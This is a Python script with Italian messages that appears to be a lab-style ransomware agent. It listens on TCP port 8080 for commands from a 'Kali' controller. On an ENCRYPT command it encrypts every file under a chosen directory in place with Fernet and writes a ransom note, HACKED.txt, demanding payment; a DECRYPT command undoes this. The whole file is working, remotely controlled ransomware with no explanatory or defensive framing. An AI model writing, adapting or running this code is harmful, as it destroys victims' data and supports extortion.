import socket
import threading
import os
from cryptography.fernet import Fernet

class LubuntuNode:
    def __init__(self, port):
        self.port = port
        self.running = True

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(5)
        print(f"[*] Nodo Lubuntu in ascolto sulla porta {self.port}...")
        
        while self.running:
            conn, addr = s.accept()
            threading.Thread(target=self.handle_client, args=(conn, addr)).start()

    def handle_client(self, conn, addr):
        print(f"[!] Connessione da Kali: {addr[0]}")
        while self.running:
            try:
                data = conn.recv(4096).decode()
                if not data: break

                # COMANDO: ENCRYPT|<directory>|<key>
                if data.startswith("ENCRYPT|"):
                    _, directory, key = data.split("|")
                    self.process_files(directory, key, mode="encrypt")
                    self.create_hacker_note(directory)
                    conn.send(b"[OK] Cartella cifrata e nota creata.")

                # COMANDO: DECRYPT|<directory>|<key>
                elif data.startswith("DECRYPT|"):
                    _, directory, key = data.split("|")
                    self.process_files(directory, key, mode="decrypt")
                    self.remove_hacker_note(directory)
                    conn.send(b"[OK] Cartella decifrata e nota rimossa.")

            except Exception as e:
                conn.send(f"[ERRORE] {str(e)}".encode())
                break
        conn.close()

    def process_files(self, directory, key, mode):
        f = Fernet(key.encode())
        for root, _, files in os.walk(directory):
            for file in files:
                if file == "HACKED.txt": continue # Non cifrare la nota
                path = os.path.join(root, file)
                with open(path, "rb") as file_data:
                    content = file_data.read()
                
                processed = f.encrypt(content) if mode == "encrypt" else f.decrypt(content)
                
                with open(path, "wb") as file_data:
                    file_data.write(processed)

    def create_hacker_note(self, directory):
        with open(os.path.join(directory, "HACKED.txt"), "w") as f:
            f.write("I TUOI DATI SONO STATI HACKERATI, PER POTER RIAVARLI PAGA E ZITTO")

    def remove_hacker_note(self, directory):
        note_path = os.path.join(directory, "HACKED.txt")
        if os.path.exists(note_path):
            os.remove(note_path)

if __name__ == "__main__":
    LubuntuNode(8080).start()